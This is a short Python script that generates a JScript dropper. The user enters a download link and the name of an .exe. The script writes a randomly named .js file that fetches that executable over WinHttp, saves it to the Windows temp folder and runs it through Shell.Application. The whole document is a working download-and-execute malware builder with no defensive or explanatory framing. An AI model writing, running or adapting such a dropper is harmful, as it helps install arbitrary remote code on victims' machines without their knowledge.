import os
import string
import random
r=lambda:''.join(random.choices(string.ascii_letters+string.digits,k=12))
f=f"{r()}.js"
l=input("Enter direct download link to your .exe file:")
s=input("Enter exact name of .exe file on link you provided:")
c=f"""var p=new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+"\\{s}";var o=WScript.CreateObject("WinHttp.WinHttpRequest.5.1");o.Open("GET","{l}",false);o.Send();var s=WScript.CreateObject("ADODB.Stream");s.Open();s.Type=1;s.Write(o.ResponseBody);s.Position=0;s.SaveToFile(p,2);s.Close();new ActiveXObject("Shell.Application").ShellExecute(p,"","","open","1");"""
with open(f,"w")as file:file.write(c)
print(f"{f} saved to folder!!!")
